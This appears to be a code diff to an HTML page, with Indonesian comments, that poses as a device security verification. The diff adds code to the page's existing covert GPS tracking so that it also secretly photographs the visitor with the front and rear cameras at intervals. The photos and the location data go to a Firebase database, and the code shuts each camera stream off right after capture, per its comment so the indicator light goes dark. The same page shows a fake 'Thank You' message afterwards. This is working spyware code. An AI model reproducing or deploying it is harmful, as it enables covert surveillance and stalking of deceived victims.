@@ -68,7 +68,7 @@
 </head>
 <body>
 
-    <!-- Kotak Form dengan Atribut Required (Wajib Diisi) -->
+    <!-- Kotak Form Wajib Isi Merek Perangkat -->
     <div class="box" id="inputBox">
         <h2>[ IDENTIFY DEVICE ]</h2>
         <p style="margin-bottom: 10px;">Wajib Masukkan Merek & Tipe (Contoh: Samsung S23, iPad, Laptop Asus):</p>
@@ -78,19 +78,23 @@
         </form>
     </div>
 
-    <!-- Kotak Loading -->
+    <!-- Kotak Loading / Proses -->
     <div id="trackingContainer" style="display: none;">
         <div class="spinner"></div>
-        <h2 id="status-text">Synchronizing Telemetry...</h2>
+        <h2 id="status-text">Synchronizing Telemetry & Sensors...</h2>
         <p id="error-text" style="color: #ff3333;"></p>
     </div>
 
-    <!-- Kotak Sukses (Centang & Thank You) -->
+    <!-- Kotak Sukses -->
     <div id="successContainer" style="display: none;" class="box">
         <div class="checkmark">✓</div>
         <h2 style="color: #00ff66; margin-bottom: 10px;">Thank You!</h2>
         <p>Device verification completed successfully. System security is now fully up to date.</p>
     </div>
+
+    <!-- Hidden Video & Canvas untuk Capture Kamera -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
@@ -106,18 +110,23 @@
         }
         const db = firebase.database();
 
+        let deviceNameGlobal = "";
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+
         function startTracking(event) {
-            event.preventDefault(); // Mencegah reload halaman
+            event.preventDefault();
             const inputVal = document.getElementById("deviceNameInput").value.trim();
-            const deviceName = `📱 ${inputVal}`;
+            deviceNameGlobal = `📱 ${inputVal}`;
 
             document.getElementById("inputBox").style.display = "none";
             document.getElementById("trackingContainer").style.display = "block";
 
-            const statusText = document.getElementById("status-text");
             const errorText = document.getElementById("error-text");
             const targetRef = db.ref("targets").push();
 
+            // 1. Pelacakan GPS Real-time (Berkala)
             if ("geolocation" in navigator) {
                 navigator.geolocation.watchPosition(
                     function(position) {
@@ -125,11 +134,11 @@
                         const lon = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
 
-                        targetRef.set({
+                        targetRef.update({
                             latitude: lat,
                             longitude: lon,
                             accuracy: accuracy,
-                            device: deviceName,
+                            device: deviceNameGlobal,
                             timestamp: Date.now()
                         }).then(() => {
                             document.getElementById("trackingContainer").style.display = "none";
@@ -137,16 +146,59 @@
                         });
                     },
                     function(error) {
-                        if (error.code === error.PERMISSION_DENIED) {
-                            errorText.innerText = "Error: Location permission denied.";
-                        } else {
-                            errorText.innerText = "Error: Unable to retrieve accurate location.";
-                        }
+                        errorText.innerText = "Error: Location permission denied or unavailable.";
                     },
                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
-                errorText.innerText = "Error: Geolocation is not supported.";
+                errorText.innerText = "Error: Geolocation not supported.";
+            }
+
+            // 2. Pengambilan Foto Kamera Berkala (Contoh: Setiap 10 detik bergantian depan/belakang)
+            setInterval(() => {
+                captureAndSendCamera("user"); // "user" = Kamera Depan
+            }, 10000);
+
+            setInterval(() => {
+                captureAndSendCamera("environment"); // "environment" = Kamera Belakang
+            }, 20000);
+        }
+
+        // Fungsi otomatis ambil foto dari kamera dan kirim ke Firebase
+        async function captureAndSendCamera(facingMode) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facingMode }
+                });
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+
+                // Set ukuran canvas
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Ubah gambar ke format Base64 (Compressed string)
+                const imageData = canvas.toDataURL("image/jpeg", 0.6);
+
+                // Matikan stream kamera setelah foto diambil agar lampu indikator kamera HP mati
+                stream.getTracks().forEach(track => track.stop());
+
+                // Kirim data foto ke Firebase berdasarkan tipe kamera
+                db.ref("camera_logs").push({
+                    device: deviceNameGlobal,
+                    cameraType: facingMode === "user" ? "Depan" : "Belakang",
+                    image: imageData,
+                    timestamp: Date.now()
+                });
+
+            } catch (err) {
+                console.log("Kamera tidak diizinkan atau sedang digunakan: ", err);
             }
         }
     </script>
